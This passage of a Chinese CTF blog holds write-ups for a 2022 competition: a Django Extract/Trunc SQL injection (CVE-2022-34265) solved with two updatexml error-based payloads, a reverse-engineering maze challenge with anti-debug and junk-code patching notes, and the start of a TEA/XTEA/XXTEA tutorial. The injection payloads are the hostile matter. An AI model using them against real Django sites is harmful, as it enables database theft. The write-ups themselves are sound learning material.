&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag) else: print(&#x27;Error&#x27;)print(flag_)#flag&#123;98167a7e-1471-11ed-a068-da12656dd8d7&#125; Web - djangogogo 这题题解是队友写的。 CVE-2022-34265 Django Extract &amp; Trunc SQL注入漏洞 参考资料：http://www.ctfiot.com/47944.html 由于字符长度限制。用/?name=YEAR FROM sale_datetime)) and updatexml(1,concat(1,(select flag from flag),1),1)--获取前半截flag。 1661257426458 用/?name=YEAR FROM sale_datetime)) and updatexml(10,concat((select RIGHT(flag,14) from flag ),1,1,1,1,1,1,1,1),1)--获得后半段flag。 1661257431800 Misc - 办公室爱情 有大佬师傅写出来了：https://blog.csdn.net/weixin_44418623/article/details/126493352 [题目下载][办公室爱情](办公室爱情.zip) Reverse - rabbit hole 这道题拿到以后运行起来，看起来像很朴素的题目，并且通过Exeinfo，并没有什么壳。 1661446868005 然后用ida运行，找到main函数0x004016C0，发现完全不能F5。仔细看有两种画指令。第一种： 1661447008186 这种可以直接patch掉EB FF中EB这一位，变成nop(90)，然后在40170A地址上按C转换为code，就可以看到后面的指令了。第二种： 1661447155378 这种往上jmp的第一次见。经过尝试可以patch掉4017D5和4017D6两个地址为nop，然后nop掉jmp语句后面的五个地址4017D9到4017DD也nop掉。这种花指令就完成了。 1661447330411 经过一顿漫长的操作，找到main函数的retn，从main函数push ebp开始选中到retn，按p，再f5终于可以看出main函数的全貌了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int __cdecl main(int argc, const char **argv, const char **envp)&#123; /* 有一堆变量定义就不贴了，大家注意变量类型。 */ v31[0] = v3; v31[1] = retaddr; v4 = alloca(4532); atexit(sub_401660); sub_401A40(); gets_s(v29, 0x100u); v5 = strlen(v29); v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F)))); v7 = HIBYTE(v5) ^ (16777619 * v6); if ( v7 != 1166501587 ) &#123; if ( v7 == 1563082853 ) &#123; v8 = 0; for ( i = 0; ; i = v9 + 16 ) &#123; v25 = v8; if ( (HIBYTE(v8) ^ (16777619 * (BYTE2(v8) ^ (16777619 * (BYTE1(v8) ^ (16777619 * ((unsigned __int8)v8 ^ 0x50C5D1F))))))) == 1563082853 ) break; v28 = 0; v9 = i; for ( j = 0; ; j = v26 + 1 ) &#123; v26 = j; if ( (HIBYTE(j) ^ (16777619 * (BYTE2(j) ^ (16777619 * (BYTE1(j) ^ (16777619 * ((unsigned __int8)j ^ 0x50C5D1F))))))) == 1563082853 ) break; v9 = i; v28 += v29[v26] * byte_404AC0[i + v26]; &#125; v11 = v25; *((_BYTE *)&amp;v31[-1130] + v25) = v28; v8 = v11 + 1; &#125; for ( k = 0; (HIBYTE(k) ^ (16777619 * (BYTE2(k) ^ (16777619 * (BYTE1(k) ^ (16777619 * ((unsigned __int8)k ^ 0x50C5D1F))))))) != 1563082853; ++k ) &#123; if ( *((_BYTE *)&amp;v31[-1130] + k) != byte_404AAC[k] ) &#123; v13 = sub_401A40(); std::ostream::operator&lt;&lt;(v13); exit(-1); &#125; &#125; v14 = sub_401A40(); std::ostream::operator&lt;&lt;(v14); JUMPOUT(0x401A17); &#125; v15 = sub_401A40(); std::ostream::operator&lt;&lt;(v15); exit(-1); &#125; strcpy(v30, &quot;The quick brown fox jumps over the lazy dog.&quot;); sub_401000(v30, v6); memset(v30, 0, 40); v17 = sub_4014E0(v30, v29, v16); for ( m = 0; m &lt; 40; ++m ) &#123; LOBYTE(v17) = v30[m]; if ( (_BYTE)v17 != byte_404BC0[m] ) &#123; v22 = (*(int (**)(void))(v17 + 1284029000))(); byte_402FFF[v22 - 4206718] += BYTE1(v23); *(_BYTE *)(v23 - 23) += v24; JUMPOUT(0x401A3D); &#125; &#125; v19 = sub_401A40(); v20 = std::ostream::operator&lt;&lt;(v19); (*(void (**)(void))(v20 - 62026936))(); return 0;&#125; 第一个需要逆向的地方是v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F)))); v7 = HIBYTE(v5) ^ (16777619 * v6);if ( v7 != 1166501587 ) 其中v5是输入字符串的长度，类型为int，四个字节。BYTE1是v5第二个字节，BYTE2是v5第三个字节，HIBYTE是最高字节，注意C语言变量是小端序。这段代码就是最小的字节和0x50C5D1F异或以后，乘以16777619，再和下一个字节异或，直到最高字节。于是python脚本： 12345678for i in range(256): v7 = i v8 = ((v7 &gt;&gt; 16) &amp; 0xff) ^ ((0x1000193 * (((v7 &gt;&gt; 8) &amp; 0xff) ^ ((0x1000193 * (((v7 &amp; 0xFF) ^ 0x50C5D1F) &amp; 0xFFFFFFFF)) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF) v9 = ((v7 &gt;&gt; 32) &amp; 0xff) ^ ((0x1000193 * v8) &amp; 0xFFFFFFFF) if (v9 == 0x458766D3 or v9 == 0x5D2AC065): print(v9,i)0x5d2ac065 160x458766d3 134 这里有两个分支，长度为134的分支是正确的。长度是16的分支进入下面的代码 1661448528575 1661448555663 无论结果是啥都进入了0x401A40的地址，猜测一下，结合下文，很容易知道这段不是需要走的分支。（比赛时候我动调进去了，查了小一会儿发现不对，还是too young！这题应该有反调试，可能是SEH的，我的x96dbg有过反调插件sharpOD。ida直接动调不行的。） 之后，有个关键函数0x4014E0很可疑，调用了输入变量v29。 1661448781490 经过一通patch后f5看到函数4014E0。发现关键语句ms_exc.registration.TryLevel = 0 这是try except的特征。tab进入汇编视图发现有try，并且在0x401546产生了异常，进入except。当时看到了 https://bbs.pediy.com/thread-252152.htm 这篇大佬师傅写的文章，也研究了一下，动调在这里也断掉了一直挂。怎么也搞不通，直到比赛结束，我还是个老菜鸡。 1661448903235 这个异常最后进入了0x4011E0这个函数，这是比赛中调到的地方。 1661449148944 比赛结束之后，晚上问大爷，大爷解释：1、这个异常是void x() &#123;char a[0];a[1145141919810];&#125; 2、SEH 反调试的原理是，遇到异常的时候会首先交给调试器，单步过不去。调试器需要改参数。 1661449598278 忽略范围-开始-C0000005-确定。添加了这个就不会在0x401546卡住了。接着在exception handler下个断点可以进入0x4011E0这个最后的函数了。最后的函数中，也是一个try exception跳到exception欺骗ida，ida确实不分析exception handler 里的代码。之后经过大爷提示，在异常代码地址patch，用jmp直接跳到exception handler就行。把0x401232地址patch成jmp到0x401278，并且把0x401278上的try except的code也patch掉了。 1661450025162 1661450043745 f5后得到了最后的函数，核心部分： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 v1 = 0; v10 = 0; v2 = input; if ( !strlen(input) ) &#123; LOWORD(v4) = 0; LOWORD(v5) = 0;LABEL_21: if ( (HIBYTE(v18) ^ (16777619 * (BYTE2(v18) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F))))))) != 1636823865 &amp;&amp; (HIBYTE(v17) ^ (16777619 * (BYTE2(v17) ^ (16777619 * (BYTE1(v4) ^ (16777619 * ((unsigned __int8)v4 ^ 0x50C5D1F))))))) != 1636823865 ) &#123; puts(v9); exit(-1); &#125; for ( i = 0; i &lt; 41; ++i ) putchar((unsigned __int8)(*((_BYTE *)v12 + i) + *((_BYTE *)v14 + i))); putchar(10); exit(0); &#125; v3 = 0; v16 = 0; v4 = 0; v5 = 0; while ( 1 ) &#123; v6 = v2[v1]; switch ( v6 ) &#123; case &#x27;h&#x27;: v18 = --v5; v3 -= 21; v16 = v3; goto LABEL_12; case &#x27;j&#x27;: v18 = v5 + 1; v16 = v3 + 21; v4 = v17; ++v5; v3 += 21; v1 = v10; v2 = input; goto LABEL_12; case &#x27;k&#x27;: --v4; break; case &#x27;l&#x27;: ++v4; break; default: goto LABEL_12; &#125; v17 = v4;LABEL_12: //判断条件 if ( v5 &lt; 0 || v4 &lt; 0 || v5 &gt;= 21 || v4 &gt;= 21 || (v5 ^ (v4 &lt;&lt; 8) ^ dword_4043C8[v3 + v4] ^ (unsigned __int8)byte_404208[v3 + v4]) != 1 ) &#123; exit(-1); &#125; v10 = ++v1; v7 = strlen(v2); v3 = v16; v2 = input; if ( v1 &gt;= v7 ) goto LABEL_21; &#125;&#125; 这显然是一个迷宫。Label12是判断条件，Label21的if满足以后，就可以真正得到flag。 先满足Label21的if: 123456for v7 in range(22): v8 = ((v7 &gt;&gt; 16) &amp; 0xff) ^ ((0x1000193 * (((v7 &gt;&gt; 8) &amp; 0xff) ^ ((0x1000193 * (((v7 &amp; 0xFF) ^ 0x50C5D1F) &amp; 0xFFFFFFFF)) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF) v9 = ((v7 &gt;&gt; 32) &amp; 0xff) ^ ((0x1000193 * v8) &amp; 0xFFFFFFFF) if v9 == 0x618ff339: print(v7)#20 迷宫出口是20，20。判断的条件Label12是位置和两个数组的异或，网上找了一段大佬的走迷宫算法改一下，便可以求出来flag。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071dirs=[(0,1),(1,0),(0,-1),(-1,0)] #当前位置四个方向的偏移量path=[] #存找到的路径 def mark(maze,pos): #给迷宫maze的位置pos标&quot;-1&quot;表示“到过了” maze[pos[0]][pos[1]]=-1 def passable(maze,pos): #检查迷宫maze的位置pos是否可通行 if (pos[0] &gt;= 21 or pos[0] &lt; 0 or pos[1] &gt;= 21 or pos[1] &lt; 0): return false return maze[pos[0]][pos[1]] ^ pos[0] ^ (pos[1] &lt;&lt; 8) == 1 def find_path(maze,pos,end): mark(maze,pos) if pos==end: print(pos,end=&quot; &quot;) #已到达出口，输出这个位置。成功结束 path.append(pos) return True for i in range(4): #否则按四个方向顺序检查 nextp=pos[0]+dirs[i][0],pos[1]+dirs[i][1] #考虑下一个可能方向 if passable(maze,nextp): #不可行的相邻位置不管 if find_path(maze,nextp,end):#如果从nextp可达出口，输出这个位置，成功结束 print(pos,end=&quot; &quot;) path.append(pos) return True return False def see_path(maze,path): #使寻找到的路径可视化 for i,p in enumerate(path): if i==0: maze[p[0]][p[1]] =&quot;E&quot; elif i==len(path)-1: maze[p[0]][p[1]]=&quot;S&quot; else: maze[p[0]][p[1]] =-2 print(&quot;\\n&quot;) flag = &quot;&quot; for i in range(len(path) - 1): dx = path[i + 1][0] - path[i][0] //后状态减去前状态。 dy = path[i + 1][1] - path[i][1] if dx == 1: flag += &quot;h&quot; if dx == -1: flag += &quot;j&quot; if dy == -1: flag += &quot;l&quot; if dy == 1: flag += &quot;k&quot; print(flag[::-1])if __name__ == &#x27;__main__&#x27;: byte_404208 = [0x45, 0x24, 0xBD, 0x3E, 0x32, 0x9D, 0x8F, 0x53, 0xCC, 0x4F, 0x8D, 0x2C, 0x7C, 0xF2, 0xBA, 0x30, 0x0D, 0xC7, 0x57, 0x19, 0x91, 0xF4, 0xE6, 0x28, 0x4F, 0xEE, 0x47, 0x7C, 0xD8, 0xF8, 0xD8, 0x79, 0xD1, 0x7A, 0x32, 0x82, 0xD9, 0xDF, 0x20, 0xD6, 0xEF, 0x5E, 0x24, 0x6E, 0x67, 0xB4, 0x9D, 0x49, 0xCA, 0xDD, 0x64, 0x9D, 0x0E, 0x2F, 0x0E, 0xBD, 0x1B, 0x81, 0xF3, 0x6B, 0x5F, 0xA1, 0xAC, 0x0E, 0x66, 0x76, 0x3F, 0xBF, 0x80, 0x94, 0x86, 0x44, 0xA9, 0xB8, 0xB8, 0xFE, 0xB5, 0x1A, 0x94, 0x6F, 0x3B, 0x64, 0xF6, 0x82, 0x76, 0x0A, 0x28, 0xAB, 0x8D, 0xB7, 0xB7, 0xC1, 0x0F, 0x1A, 0x3A, 0xFC, 0x77, 0x71, 0xE6, 0x5F, 0x3C, 0x9F, 0xEC, 0x3A, 0x83, 0xAF, 0x32, 0x9D, 0x43, 0xD6, 0xD0, 0x9B, 0x14, 0xBD, 0x78, 0xDC, 0xD6, 0xC2, 0x1D, 0x54, 0xB3, 0xCE, 0xF8, 0x71, 0x92, 0x44, 0x85, 0xA2, 0x58, 0xEF, 0x80, 0x2F, 0xF0, 0x90, 0xF4, 0xAB, 0xDB, 0x63, 0x74, 0xE1, 0xBB, 0xCA, 0xC5, 0xAC, 0x39, 0xA7, 0x56, 0x45, 0x25, 0xAA, 0xCA, 0x2A, 0x30, 0x95, 0xDC, 0x17, 0x31, 0x4F, 0x62, 0x39, 0xA4, 0x1C, 0x93, 0xE1, 0xA9, 0x2F, 0xB3, 0x4F, 0x26, 0x53, 0x47, 0x23, 0xDB, 0x34, 0xDE, 0xC1, 0x27, 0x5F, 0xEB, 0x2E, 0x91, 0x5E, 0xCA, 0xCB, 0xD6, 0x11, 0xA3, 0x8F, 0x47, 0xDD, 0xC0, 0xFB, 0xEE, 0xCF, 0xC9, 0xCA, 0xD9, 0xF8, 0xB9, 0x15, 0x34, 0x23, 0x6B, 0x6D, 0x28, 0xF6, 0xE2, 0x1E, 0xF8, 0xFF, 0xEB, 0xFB, 0xE9, 0x70, 0x5C, 0xD4, 0xED, 0x78, 0xD4, 0x7A, 0x22, 0x1C, 0x69, 0xF1, 0x39, 0x61, 0xC2, 0xB9, 0x7B, 0xF3, 0xC2, 0xA2, 0x99, 0x64, 0x48, 0xAC, 0x38, 0x55, 0x0C, 0xB3, 0x0B, 0xD6, 0x9B, 0x46, 0x70, 0x8B, 0xCD, 0x0F, 0x87, 0xCB, 0x7F, 0xE0, 0xAB, 0x4A, 0xCB, 0x79, 0x43, 0xE2, 0x60, 0x15, 0x0A, 0x7C, 0x0A, 0xD9, 0x15, 0x41, 0xF3, 0x2C, 0x2C, 0x61, 0x14, 0xC1, 0x43, 0xA5, 0x1A, 0xC7, 0x33, 0xC9, 0x89, 0xB7, 0x37, 0xC4, 0x57, 0x81, 0x23, 0xCA, 0xD4, 0xF1, 0x7E, 0xF4, 0x65, 0x8D, 0x72, 0x6B, 0xA4, 0x9A, 0xEE, 0xAC, 0xBA, 0x71, 0x4E, 0xDE, 0x6A, 0x88, 0x36, 0x1D, 0x72, 0xB1, 0xF0, 0x9B, 0x69, 0x19, 0xB0, 0x7C, 0xEA, 0xF7, 0x51, 0x62, 0xD1, 0x3A, 0x67, 0x56, 0x66, 0xBA, 0x79, 0x59, 0x66, 0xB1, 0xC5, 0x8F, 0xE9, 0x6C, 0x99, 0x3C, 0xF0, 0x89, 0xF6, 0xBF, 0x15, 0x61, 0x92, 0xE0, 0x60, 0x3E, 0x59, 0x35, 0x4B, 0x1F, 0x6F, 0x65, 0xE4, 0x71, 0x0D, 0x7B, 0x6E, 0x93, 0x14, 0x5D, 0x4C, 0x6F, 0x2F, 0x52, 0xA6, 0x5D, 0x90, 0x7B, 0xCC, 0xE1, 0x69, 0x77, 0x7E, 0x8D, 0x33, 0x6B, 0x37, 0xC4, 0x2F, 0xBF, 0x6F, 0xBF, 0xA8, 0xB3, 0x61, 0x5C, 0xD2, 0xC2, 0x2D, 0xC8, 0xF4, 0xBB, 0xB2, 0xD0, 0x22, 0x9C, 0x75, 0xDF, 0x59, 0x72, 0xAA, 0xFD, 0x7E, 0x67, 0x2E, 0x61, 0xBA, 0x6B, 0x4B, 0x19, 0xA6, 0xD5, 0x11, 0x15, 0xBC, 0x91, 0xEB, 0x42, 0xCC, 0x72, 0xB2, 0xC6, 0x47, 0xA3, 0xCC, 0xAC, 0x6C, 0xA8, 0xD8, 0xCA, 0xD2, 0x84, 0x2B, 0x35, 0xAB, 0xAF, 0xC8, 0xA5, 0x2F, 0x7F, 0x7F, 0xF5, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] dword_4043C8 = [0x00000044, 0x00000124, 0x000002BD, 0x0000033E, 0x00000432, 0x0000059D, 0x0000068F, 0x00000753, 0x000008CC, 0x0000094F, 0x00000A8D, 0x00000B2C, 0x00000C7C, 0x00000DF2, 0x00000EBA, 0x00000F30, 0x0000100D, 0x000011C7, 0x00001257, 0x00001319, 0x00001491, 0x000000F4, 0x000001E7, 0x00000229, 0x0000034F, 0x000004EE, 0x00000547, 0x0000067C, 0x000007D8, 0x000008F8, 0x000009D8, 0x00000A79, 0x00000BD1, 0x00000C7A, 0x00000D32, 0x00000E82, 0x00000FD9, 0x000010DF, 0x00001120, 0x000012D6, 0x000013EE, 0x0000145F, 0x00000027, 0x0000016C, 0x00000265, 0x000003B7, 0x0000049F, 0x0000054B, 0x000006C8, 0x000007DF, 0x00000866, 0x0000099F, 0x00000A0C, 0x00000B2D, 0x00000C0C, 0x00000DBF, 0x00000E19, 0x00000F83, 0x000010F1, 0x00001169, 0x0000125C, 0x000013A3, 0x000014AE, 0x0000000C, 0x00000164, 0x00000274, 0x0000033D, 0x000004BD, 0x00000582, 0x00000696, 0x00000784, 0x00000846, 0x000009AB, 0x00000ABA, 0x00000BBA, 0x00000CFC, 0x00000DB7, 0x00000E18, 0x00000F96, 0x0000106C, 0x00001138, 0x00001267, 0x000013F5, 0x00001481, 0x00000072, 0x0000010E, 0x0000022C, 0x000003AF, 0x00000489, 0x000005B3, 0x000006B3, 0x000007C5, 0x0000080B, 0x0000091E, 0x00000A3E, 0x00000BF8, 0x00000C73, 0x00000D75, 0x00000EE2, 0x00000F5A, 0x00001038, 0x0000119A, 0x000012E9, 0x0000133F, 0x00001487, 0x000000AA, 0x00000137, 0x00000298, 0x00000346, 0x000004D3, 0x000005D5, 0x0000069E, 0x00000711, 0x000008B8, 0x0000097D, 0x00000AD9, 0x00000BD3, 0x00000CC7, 0x00000D18, 0x00000E51, 0x00000FB7, 0x000010CB, 0x000011FC, 0x00001274, 0x00001396, 0x00001441, 0x00000082, 0x000001A5, 0x0000025F, 0x000003E8, 0x00000487, 0x00000528, 0x000006F7, 0x00000797, 0x000008F3, 0x000009AC, 0x00000ADC, 0x00000B65, 0x00000C73, 0x00000DE6, 0x00000EBC, 0x00000FCD, 0x000010C3, 0x000011AB, 0x0000123F, 0x000013A0, 0x00001450, 0x00000043, 0x00000122, 0x000002AD, 0x000003CD, 0x0000042D, 0x00000537, 0x00000692, 0x000007DB, 0x00000810, 0x00000936, 0x00000A49, 0x00000B65, 0x00000C3E, 0x00000DA3, 0x00000E1B, 0x00000F95, 0x000010E6, 0x000011AF, 0x00001228, 0x000013B5, 0x00001448, 0x0000002F, 0x0000015B, 0x0000024E, 0x0000032A, 0x000004D2, 0x0000053C, 0x000006D6, 0x000007C9, 0x0000082F, 0x00000957, 0x00000AE2, 0x00000B26, 0x00000C98, 0x00000D57, 0x00000EC3, 0x00000FC2, 0x000010DE, 0x00001118, 0x000012AB, 0x00001386, 0x0000144F, 0x000000D5, 0x000001C9, 0x000002F3, 0x000003E7, 0x000004C6, 0x000005C0, 0x000006C2, 0x000007D1, 0x000008F0, 0x000009B0, 0x00000A1D, 0x00000B3D, 0x00000C2A, 0x00000D62, 0x00000E64, 0x00000F20, 0x000010FF, 0x000011EA, 0x00001217, 0x000013F0, 0x000014F6, 0x000000E0, 0x000001F0, 0x000002E2, 0x0000037B, 0x00000456, 0x000005DE, 0x000006E6, 0x00000772, 0x000008DF, 0x00000970, 0x00000A29, 0x00000B16, 0x00000C62, 0x00000DFB, 0x00000E33, 0x00000F6A, 0x000010C8, 0x000011B2, 0x00001271, 0x000013F8, 0x000014C8, 0x000000A9, 0x00000192, 0x0000026F, 0x00000342, 0x000004A7, 0x00000533, 0x0000065F, 0x00000707, 0x000008B9, 0x00000900, 0x00000ADC, 0x00000B90, 0x00000C4C, 0x00000D7B, 0x00000E81, 0x00000FC7, 0x00001004, 0x0000118D, 0x000012C0, 0x00001375, 0x000014EB, 0x000000A7, 0x00000147, 0x000002C6, 0x00000374, 0x0000044F, 0x000005EE, 0x0000066D, 0x00000719, 0x00000807, 0x00000970, 0x00000A07, 0x00000BD5, 0x00000C18, 0x00000D4D, 0x00000EFE, 0x00000F20, 0x00001021, 0x0000116C, 0x00001218, 0x000013CC, 0x0000144F, 0x000000A8, 0x00000117, 0x000002CA, 0x0000033F, 0x000004C5, 0x00000585, 0x000006BB, 0x0000073A, 0x000008C8, 0x0000095A, 0x00000A8D, 0x00000B2F, 0x00000CC6, 0x00000DD8, 0x00000EFD, 0x00000F73, 0x000010F8, 0x00001168, 0x00001280, 0x0000137E, 0x00001466, 0x000000AA, 0x00000194, 0x000002E0, 0x000003A2, 0x000004B4, 0x0000057F, 0x00000640, 0x000007D0, 0x00000865, 0x00000986, 0x00000A38, 0x00000B13, 0x00000C7C, 0x00000DBF, 0x00000EFE, 0x00000F95, 0x00001066, 0x00001117, 0x000012BE, 0x00001373, 0x000014E4, 0x000000F9, 0x0000015F, 0x0000026C, 0x000003DF, 0x00000434, 0x00000569, 0x00000658, 0x00000768, 0x000008B4, 0x00000976, 0x00000A56, 0x00000B68, 0x00000CBF, 0x00000DCB, 0x00000E81, 0x00000FE7, 0x00001062, 0x00001196, 0x00001233, 0x000013FE, 0x00001486, 0x000000E7, 0x000001AF, 0x00000205, 0x00000371, 0x00000482, 0x000005F0, 0x00000670, 0x0000072E, 0x00000849, 0x00000925, 0x00000A5B, 0x00000B0E, 0x00000C7F, 0x00000D75, 0x00000EF4, 0x00000F61, 0x0000101D, 0x0000116B, 0x0000127E, 0x00001382, 0x00001404, 0x0000004D, 0x0000015C, 0x0000027F, 0x0000033F, 0x00000442, 0x000005B6, 0x0000064D, 0x00000780, 0x0000086B, 0x000009DC, 0x00000AF1, 0x00000B79, 0x00000C66, 0x00000D6E, 0x00000E9D, 0x00000F23, 0x0000107B, 0x00001126, 0x000012D5, 0x0000133F, 0x000014AE, 0x0000007D, 0x000001AD, 0x000002BB, 0x000003A1, 0x00000473, 0x0000054E, 0x000006C0, 0x000007D0, 0x0000083F, 0x000009DA, 0x00000AE6, 0x00000BA9, 0x00000CA0, 0x00000DC3, 0x00000E30, 0x00000F8E, 0x00001066, 0x000011CD, 0x0000124B, 0x00001361, 0x000014B8, 0x000000EE, 0x0000016D, 0x00000275, 0x0000033C, 0x00000473, 0x000005A8, 0x00000679, 0x00000759, 0x0000080B, 0x000009B4, 0x00000AC7, 0x00000B03, 0x00000C07, 0x00000DAE, 0x00000E82, 0x00000FF8, 0x00001050, 0x000011DF, 0x00001261, 0x000013A0, 0x000014D5, 0x00000053, 0x000001B7, 0x000002D8, 0x000003B8, 0x00000478, 0x000005BC, 0x000006CC, 0x000007DE, 0x000008C6, 0x00000990, 0x00000A3F, 0x00000B21, 0x00000CBF, 0x00000DBB, 0x00000EDC, 0x00000FB1, 0x0000103B, 0x0000116B, 0x0000126B, 0x000013E0, 0x00001434] tmp = [] for i in range(441): tmp.append(dword_4043C8[i] ^ byte_404208[i]) maze = [] for i in range(21): for i in range(21): print(tmp[i * 21 + 0 : i * 21 + 21]) maze.append(tmp[i * 21 + 0 : i * 21 + 21]) start=(0,0) end=(20,20) find_path(maze,start,end) see_path(maze,path)#jjjllllllllllllllljjjjjjjjkjjkkkkhhhhhhhkkkkkkkkkkjjjjllljjjlllhhhhlljjjjjjkkkkkkkkjjlllllllllllhhlllllhhhlhhhhhhhhlljjjjjjjjjjjjjjjjl 最终结果： 1661451301787 总结 这道题确实超出我能力范围，还需要接着努力。长城杯这道题做出来的人，高校组差不多有十个左右？政企组就只有两个，如果这个题做出来了，应该可以去线下了吧。不过这一年的努力没有白费，希望网鼎杯能出好成绩。关于try except中，SEH反调试优先交给调试器这个我有个印象，之前听大佬们讲直播讲课有提及。hed10ne大佬留了一篇反调试佳作：反调试技术整理","categories":[{"name":"reverse","slug":"reverse","permalink":"https://feverhu.github.io/categories/reverse/"},{"name":"match","slug":"reverse/match","permalink":"https://feverhu.github.io/categories/reverse/match/"}],"tags":[{"name":"异常处理","slug":"异常处理","permalink":"https://feverhu.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"}]},{"title":"TEA学习","slug":"TEA学习","date":"2022-08-07T02:04:53.000Z","updated":"2022-08-07T07:14:26.882Z","comments":true,"path":"2022/08/07/TEA学习/","link":"","permalink":"https://feverhu.github.io/2022/08/07/TEA%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"TEA 感谢各位师傅，转载连接：https://www.cnblogs.com/sk2rw/p/14797633.html 我做做删减和补充。 简介 TEA算法使用64位的明文分组和128位的密钥，使用feistel分组加框架，需要进行32轮循环得到最后的64位密文，其中magic number DELTA是由黄金分割点。 tea算法最关键的是要找到DELTA值和128位的key。 在逆向程序的时候，可以利用ida的插件findcypto识别tea算法。 如上图的程序，可以看出a2就是key，v4-=0x61c88647和v4+=0x9e3779b9是等价的，显然DELTA就是0x9e3779b9 Tea算法还可以进行魔改，魔改的地方主要是DELTA值，将这个值修改会让很多加密算法识别软件失效，像下面的程序就将DELTA魔改为0x1234567，绕过来peid的插件KANAL的识别。 补充TEA及魔改TEA加密与解密源码： 初级TEA 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; //加密函数void encrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i &lt; 32; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125;//解密函数void decrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i&lt;32; i++) &#123; /* basic cycle start */ v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125; int main()&#123; uint32_t v[2]=&#123;1,2&#125;,k[4]=&#123;2,2,3,4&#125;; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]); encrypt(v, k); printf(&quot;加密后的数据：%u %u\\n&quot;,v[0],v[1]); decrypt(v, k); printf(&quot;解密后的数据：%u %u\\n&quot;,v[0],v[1]); return 0;&#125; TEA升级版XTEA 增加了更多的密钥表，移位和异或等操作。 XTEA是TEA的扩展，也称做TEAN，它使用与TEA相同的简单运算，同样是一个64位块的Feistel密码，使用128位密钥，建议64轮, 但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758加密前原始数据：1 2 加密后的数据：1347371722 925494771 解密后的数据：1 2 Process returned 0 (0x0) execution time : 0.020 s Press any key to continue. XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler加密过程：算法实现：示例代码：[cpp] view plain copy#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1; &#125; void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0]=v0; v[1]=v1; &#125; int main() &#123; uint32_t v[2]=&#123;1,2&#125;; uint32_t const k[4]=&#123;2,2,3,4&#125;; unsigned int r=32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]); encipher(r, v, k); printf(&quot;加密后的数据：%u %u\\n&quot;,v[0],v[1]); decipher(r, v, k); printf(&quot;解密后的数据：%u %u\\n&quot;,v[0],v[1]); return 0; &#125; XXTEA 又称Corrected Block TEA，是XTEA的升级版 XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x9e3779b9 #define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) &#123; uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 